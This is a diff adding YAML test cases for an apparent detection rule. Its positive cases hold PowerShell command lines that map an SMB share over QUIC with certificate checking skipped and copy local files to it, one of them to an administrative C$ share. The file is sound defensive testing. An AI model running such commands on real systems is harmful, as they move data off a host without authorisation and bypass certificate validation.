@@ -1,0 +1,26 @@
+id: a4a0b85e-6503-452f-8506-f9c30505ce72
+positive:
+- name: New-SmbMapping over QUIC with no certificate check, then Copy-Item
+  event: &ev
+    event.code: "1"
+    process.name: powershell.exe
+    process.executable: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    process.command_line: 'powershell.exe -c "New-SmbMapping -LocalPath Z: -RemotePath \\files.corp.example\share -TransportType QUIC -SkipCertificateCheck; Copy-Item C:\data\a.zip Z:\"'
+    process.parent.name: cmd.exe
+- name: the same mapping to an administrative share
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "New-SmbMapping -RemotePath \\srv\C$ -TransportType QUIC -SkipCertificateCheck; copy C:\a Z:\"
+negative:
+- name: QUIC mapping with certificate check kept on
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "New-SmbMapping -RemotePath \\srv\share -TransportType QUIC; Copy-Item a b"
+- name: no copy in the command line
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "New-SmbMapping -RemotePath \\srv\share -TransportType QUIC -SkipCertificateCheck"
+- name: ordinary TCP mapping
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "New-SmbMapping -RemotePath \\srv\share; Copy-Item a b"
